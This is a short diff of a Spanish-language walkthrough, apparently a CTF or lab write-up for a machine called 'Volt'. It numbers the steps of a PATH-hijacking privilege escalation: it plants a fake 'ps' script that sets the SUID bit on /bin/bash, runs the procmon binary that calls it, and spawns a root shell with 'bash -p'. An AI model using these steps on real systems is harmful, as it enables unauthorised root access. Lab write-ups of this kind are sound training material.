@@ -207,18 +207,26 @@ echo $PATH
 
 Ahora solo tengo que crear un script que se llame `ps` y el binario buscará primero en `/tmp` si existe, como lo he creado va a ejecutar mi script
 
-creamos un script por ejmplo así:
+1-creamos un script por ejmplo así:
 
 ```bash
 echo "chmod u+s /bin/bash" > ps
 ```
+2-damos permisos de ejecución
 
-ejecutamos el binario:
+```bash
+chmod +x ps
+```
+
+3-ejecutamos el binario:
 
 ```bash
 /usr/local/bin/procmon
 ```
 
-hemos cambiado la `/bin/bash` y ejecutando `bash -p` somos root:
+4- como `/bin/bash` tiene ahora el Bit SUID podemos ejecutarlo y hacernos root:
+```bash
+/bin/bash -p
+```
 
 ![VoltImage](images/volt/21.png)
